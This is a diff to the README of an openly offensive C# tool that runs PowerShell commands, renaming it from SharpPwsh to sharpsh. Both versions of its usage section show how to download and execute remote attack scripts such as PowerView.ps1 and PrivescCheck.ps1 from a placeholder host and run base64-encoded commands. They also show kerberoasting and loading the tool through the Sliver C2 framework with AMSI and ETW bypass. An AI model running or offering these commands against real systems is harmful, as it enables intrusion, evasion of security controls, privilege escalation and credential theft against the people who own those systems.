@@ -1,4 +1,4 @@
-# SharpPwsh
+# sharpsh
 C# .Net Framework program that uses `RunspaceFactory` for Powershell command execution.
 
 ## Features
@@ -12,7 +12,7 @@ C# .Net Framework program that uses `RunspaceFactory` for Powershell command exe
 ## Usage
 
 ```
-SharpPwsh 1.0.0.0
+sharpsh 1.0.0.0
 Copyright c  2022
 
   -c, --cmd            Required. Powershell command to run
@@ -34,31 +34,31 @@ Copyright c  2022
 
 ```
 # execute powershell command
-PS > .\SharpPwsh.exe -c whoami
+PS > .\sharpsh.exe -c whoami
 
 # execute base64 encoded powershell command
-PS > .\SharpPwsh.exe -e -c d2hvYW1pCg==
+PS > .\sharpsh.exe -e -c d2hvYW1pCg==
 
 # load script from clipboard and execute command
-PS > .\SharpPwsh.exe -p -c Get-NetLocalGroup
+PS > .\sharpsh.exe -p -c Get-NetLocalGroup
 
 # load remote script and execute
-PS > .\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
+PS > .\sharpsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
 
 # load remote script and execute encoded command
-PS > .\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -e -c R2V0LU5ldExvY2FsR3JvdXAK
+PS > .\sharpsh.exe -u http://x.x.x.x/PowerView.ps1 -e -c R2V0LU5ldExvY2FsR3JvdXAK
 
 # execute multiple powershell commands
-PS > .\SharpPwsh.exe -c hostname,whoami
+PS > .\sharpsh.exe -c hostname,whoami
 
 # execute multiple powershell commands using multiple scripts
-PS > .\SharpPwsh.exe -c get-netlocalgroup,invoke-privesccheck -u http://x.x.x.x/PowerView.ps1,http://x.x.x.x/PrivescCheck.ps1 -b
+PS > .\sharpsh.exe -c get-netlocalgroup,invoke-privesccheck -u http://x.x.x.x/PowerView.ps1,http://x.x.x.x/PrivescCheck.ps1 -b
 
 # sliver inline & bypass AMSI + ETW
-sliver > execute-assembly -M -E -i /tools/SharpPwsh.exe -c get-netlocalgroup -u http://x.x.x.x/psh/PowerSploit/Recon/PowerView.ps1
+sliver > execute-assembly -M -E -i /tools/sharpsh.exe -c get-netlocalgroup -u http://x.x.x.x/psh/PowerSploit/Recon/PowerView.ps1
 
 # sliver BOF & bypass AMSI
-sliver > inline-execute-assembly /tools/SharpPwsh.exe '-b -c invoke-kerberoast -u http://x.x.x.x/PowerView.ps1'
+sliver > inline-execute-assembly /tools/sharpsh.exe '-b -c invoke-kerberoast -u http://x.x.x.x/PowerView.ps1'
 ```
 
 ## Planned
